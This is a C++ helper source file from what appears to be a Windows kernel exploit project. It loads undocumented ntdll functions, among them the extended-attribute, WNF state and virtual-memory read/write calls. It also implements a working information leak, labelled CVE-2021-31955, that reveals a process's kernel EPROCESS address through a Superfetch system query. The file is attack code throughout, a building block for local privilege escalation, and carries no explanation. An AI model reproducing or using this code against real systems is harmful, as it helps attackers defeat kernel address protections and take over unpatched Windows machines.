#include "pch.h"
#include "Helper.h"

BOOL InitializeUndocumentedAPI()
{
	HMODULE hNtDll = GetModuleHandleA("ntdll.dll");

	if (!hNtDll)
	{
		Ulog("Ntdll not found");
		return false;
	}

	NtQueryEaFile = (__ZwQueryEaFile)GetProcAddress(hNtDll, "NtQueryEaFile");
	NtSetEaFile = (__ZwSetEaFile)GetProcAddress(hNtDll, "ZwSetEaFile");
	NtCreateWnfStateName = (__NtCreateWnfStateName)GetProcAddress(hNtDll, "NtCreateWnfStateName");
	NtUpdateWnfStateData = (__NtUpdateWnfStateData)GetProcAddress(hNtDll, "NtUpdateWnfStateData");
	NtQueryWnfStateData = (__NtQueryWnfStateData)GetProcAddress(hNtDll, "NtQueryWnfStateData");
	NtDeleteWnfStateData = (__NtDeleteWnfStateData)GetProcAddress(hNtDll, "NtDeleteWnfStateData");
	NtDeleteWnfStateName = (__NtDeleteWnfStateName)GetProcAddress(hNtDll, "NtDeleteWnfStateName");
	NtQuerySystemInformation = (__NtQuerySystemInformation)GetProcAddress(hNtDll, "NtQuerySystemInformation");
	NtReadVirtualMemory = (__NtReadVirtualMemory)GetProcAddress(hNtDll, "NtReadVirtualMemory");
	NtWriteVirtualMemory = (__NtWriteVirtualMemory)GetProcAddress(hNtDll, "NtWriteVirtualMemory");

	if (NtQueryEaFile == NULL ||
		NtSetEaFile == NULL ||
		NtCreateWnfStateName == NULL ||
		NtUpdateWnfStateData == NULL ||
		NtQueryWnfStateData == NULL ||
		NtDeleteWnfStateData == NULL ||
		NtDeleteWnfStateName == NULL ||
		NtReadVirtualMemory == NULL ||
		NtWriteVirtualMemory == NULL ||
		NtQuerySystemInformation == NULL)
	{
		Ulog("Failed to find all Nt* functions");
		return false;
	}

	return true;
}

// CVE-2021-31955
//
UINT_PTR LeakEPProcess(DWORD ProcessId)
{

	ULONG OutBufferSize = 0;
	BYTE SuperfetchBuffer[0x70] = {};
	SUPERFETCH_INFORMATION SuperfetchInfo = { 0 };
	PF_PRIVSOURCE_QUERY_REQUEST* pPFPrivSourceQueryRequest = 0;

	
	*(DWORD*)SuperfetchBuffer = 8; // Windows 10
	*(DWORD*)&SuperfetchBuffer[4] = 0;

	SuperfetchInfo.InfoClass = SuperfetchPrivSourceQuery;
	SuperfetchInfo.Version = 45;
	SuperfetchInfo.Magic = 'kuhC';
	SuperfetchInfo.Data = SuperfetchBuffer;
	SuperfetchInfo.Length = sizeof(SuperfetchBuffer);

	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	ULONG pf_privsource_query_request_version = *(DWORD*)SuperfetchBuffer;

	Status = NtQuerySystemInformation(0x4f, &SuperfetchInfo, sizeof(SUPERFETCH_INFORMATION), &OutBufferSize);

	pPFPrivSourceQueryRequest = (PF_PRIVSOURCE_QUERY_REQUEST*)(new BYTE[2 * OutBufferSize]());

	if (!pPFPrivSourceQueryRequest)
	{
		Ulog("Failed to allocate memory with length (%d) for pPFPrivSourceQueryRequest", 2 * OutBufferSize);
		return 0;
	}

	pPFPrivSourceQueryRequest->__u0.__sv3.InfoCount = 0;
	pPFPrivSourceQueryRequest->Version = pf_privsource_query_request_version;
	SuperfetchInfo.Data = pPFPrivSourceQueryRequest;
	SuperfetchInfo.Length = 2 * OutBufferSize;

	Status = NtQuerySystemInformation(0x4f, &SuperfetchInfo, sizeof(SUPERFETCH_INFORMATION), &OutBufferSize);

	if (pf_privsource_query_request_version == 3)
	{
		auto sv3_request = &pPFPrivSourceQueryRequest->__u0.__sv3;

		for (ULONG i = 0; i < sv3_request->InfoCount; ++i)
		{
			if(sv3_request->InfoArrayV3[i].DbInfo.ProcessId == ProcessId)
				return sv3_request->InfoArrayV3[i].EProcess;
		}
	}
	else
	{
		auto sv3plus_request = &pPFPrivSourceQueryRequest->__u0.__sv3plus;

		for (ULONG i = 0; i < sv3plus_request->InfoCount; ++i)
		{
			if (sv3plus_request->InfoArrayV3Plus[i].ProcessId == ProcessId)
				return sv3plus_request->InfoArrayV3Plus[i].EProcess;
		}
	}

	if (pPFPrivSourceQueryRequest)
	{
		delete[] pPFPrivSourceQueryRequest;
		pPFPrivSourceQueryRequest = 0;
	}

	return 0;
}

void PrintByteArray(const UCHAR* byteArray, size_t size)
{
	for (size_t i = 0; i < size; i++)
	{
		std::cout << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(byteArray[i]) << " ";
	}
	std::cout << std::endl;
}